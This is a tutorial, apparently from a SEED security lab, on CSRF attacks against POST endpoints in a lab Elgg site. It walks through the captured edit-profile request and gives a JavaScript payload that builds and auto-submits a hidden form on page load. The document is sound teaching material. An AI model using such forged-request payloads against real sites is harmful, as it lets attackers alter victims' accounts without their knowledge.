# Attacking POST Services

Unlike GET requests, **POST** requests store their data in the **HTTP request body** instead of the URL. Because the request parameters are not visible in the URL, forging a POST request is slightly more difficult than forging a GET request.

In this lab, the objective is to modify another user's profile. Normally, a user edits their own profile through the web interface, and clicking **Save** sends an HTTP POST request to the server.

A CSRF attack attempts to replicate this same process by automatically filling out and submitting a form from a malicious webpage.

---

# The Edit-Profile POST Request

To successfully forge a POST request, we first need to determine exactly what the legitimate request looks like.

This can be done using browser developer tools or extensions such as **HTTP Header Live**, which capture every HTTP request sent by the browser.

An example request is shown below.

## Request URL

```text
http://www.seed-server.com/action/profile/edit
```

Unlike a GET request, notice that **no data appears in the URL**.

---

## HTTP Headers

The browser automatically includes several HTTP headers with the request, such as:

```text
Host: www.seed-server.com
User-Agent: Mozilla/5.0 ...
Accept: text/html,...
Content-Type: multipart/form-data
Content-Length: ...
Origin: http://www.seed-server.com
Referer: http://www.seed-server.com/profile/charlie/edit
Cookie: Elgg=<session-id>
```

The most important header is the **Cookie** header.

The browser automatically attaches the authenticated session cookie, allowing the server to recognize the logged-in user. The attacker does not need to know the session ID because the victim's browser includes it automatically.

---

## POST Data

The actual profile information is stored inside the request body.

A simplified example is shown below:

```text
__elgg_token=...
__elgg_ts=...
name=Charlie
briefdescription=Samy is my hero!
accesslevel[briefdescription]=2
description=...
guid=58
```

Some important fields include:

| Parameter | Purpose |
|-----------|---------|
| `__elgg_token` | CSRF protection token (disabled during this lab) |
| `__elgg_ts` | Timestamp used with the CSRF token |
| `name` | User's display name |
| `briefdescription` | Profile description |
| `accesslevel[...]` | Controls who can view the profile field |
| `guid` | Unique identifier of the target user |

The `guid` parameter is especially important because it identifies which user's profile is being modified.

---

# Sending POST Requests

One of the easiest ways to generate a POST request is through an HTML form.

For example:

```html
<form action="http://www.example.com/action.php" method="post">

  <label>First Name:</label>
  <input type="text" name="fname">

  <label>Last Name:</label>
  <input type="text" name="lname">

  <input type="submit" value="Submit">

</form>
```

When the user submits the form:

1. The browser collects the values entered into the input fields.
2. It places those values inside the HTTP request body.
3. A POST request is sent to the URL specified in the `action` attribute.

This is the normal mechanism used by web applications when users submit forms.

---

# Forging POST Requests

A CSRF attack recreates this same form submission process without the victim's knowledge.

Instead of displaying a visible form, the attacker:

1. Dynamically creates a hidden HTML form.
2. Fills the form with the desired values.
3. Adds the form to the webpage.
4. Automatically submits the form when the page loads.

A simplified example is shown below:

```javascript
function send_post() {

    var fields = "";
    fields += "<input type='hidden' name='name' value='Bob Smith'>";
    fields += "<input type='hidden' name='age' value='20'>";

    var form = document.createElement("form");

    form.action = "http://www.example.com";
    form.method = "post";
    form.innerHTML = fields;

    document.body.appendChild(form);

    form.submit();
}

window.onload = function () {
    send_post();
};
```

### How It Works

The script performs the following steps:

1. Creates hidden input fields containing the attacker's chosen values.
2. Dynamatically creates an HTML form.
3. Sets the form's destination (`action`) to the target website.
4. Specifies that the form should use the **POST** method.
5. Appends the form to the webpage.
6. Automatically submits the form as soon as the page loads.

From the victim's perspective, nothing appears unusual because the form is hidden.

If the victim is already logged into the target website, the browser automatically attaches the authenticated session cookie when submitting the POST request.

As a result, the target server processes the request as though it were submitted directly by the victim, allowing the attacker to modify the victim's profile without their knowledge.
